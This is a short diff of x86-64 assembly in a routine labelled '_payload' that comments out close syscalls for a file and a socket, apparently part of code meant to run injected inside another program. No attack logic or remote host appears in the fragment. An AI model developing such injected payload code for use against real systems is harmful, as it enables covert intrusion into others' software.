@@ -101,15 +101,15 @@ _payload:
 	jmp .clean
 
 .clean:
-	; Close the file
-	mov rax, 3					; SYS_close
-	mov rdi, r12				; file descriptor
-	syscall
+	; ; Close the file
+	; mov rax, 3					; SYS_close
+	; mov rdi, r12				; file descriptor
+	; syscall
 
-	; Close the socket
-	mov rax, 3					; SYS_close
-	mov rdi, r13				; file descriptor
-	syscall
+	; ; Close the socket
+	; mov rax, 3					; SYS_close
+	; mov rdi, r13				; file descriptor
+	; syscall
 
 	popx rax, rdi, rsi, rdx, r10
 	; jmp     [rel 0x0]
